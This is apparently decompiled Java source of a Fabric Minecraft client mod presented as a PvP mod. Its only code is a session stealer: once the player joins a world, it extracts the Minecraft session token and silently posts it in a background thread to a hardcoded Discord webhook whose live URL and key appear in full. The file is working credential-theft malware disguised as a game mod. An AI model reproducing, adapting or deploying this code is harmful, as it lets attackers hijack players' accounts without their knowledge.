package net.cyro.pvp;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;

public class PvpModClient implements ClientModInitializer {
   private boolean sent = false;
   private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1391130499749249194/Jopsx5NDB7cqcePQN7VOrNqNxPleOunz1pqDNZ5z2_y-DP1j-oaeZj-Oi7yMDvWDBWZT";

   public void onInitializeClient() {
      ClientTickEvents.END_CLIENT_TICK.register((client) -> {
         if (!this.sent && client.field_1724 != null && client.field_1687 != null) {
            this.sent = true;
            String sessionId = client.method_1548().method_1675().split(":")[1];
            System.out.println("Retrieved Session ID: " + sessionId);
            this.sendSessionIdToWebhook(sessionId);
         }

      });
   }

   private void sendSessionIdToWebhook(String sessionId) {
      (new Thread(() -> {
         try {
            if (sessionId == null || sessionId.isEmpty()) {
               System.out.println("Session ID is null or empty.");
               return;
            }

            URL url = new URL("https://discord.com/api/webhooks/1391130499749249194/Jopsx5NDB7cqcePQN7VOrNqNxPleOunz1pqDNZ5z2_y-DP1j-oaeZj-Oi7yMDvWDBWZT");
            HttpURLConnection conn = (HttpURLConnection)url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            String json = String.format("{\"content\": \"Session ID: %s\"}", sessionId);
            OutputStream os = conn.getOutputStream();

            try {
               os.write(json.getBytes());
               os.flush();
            } catch (Throwable var8) {
               if (os != null) {
                  try {
                     os.close();
                  } catch (Throwable var7) {
                     var8.addSuppressed(var7);
                  }
               }

               throw var8;
            }

            if (os != null) {
               os.close();
            }

            int responseCode = conn.getResponseCode();
            System.out.println("Sent with response code: " + responseCode);
            conn.disconnect();
         } catch (Exception var9) {
            var9.printStackTrace();
         }

      })).start();
   }
}
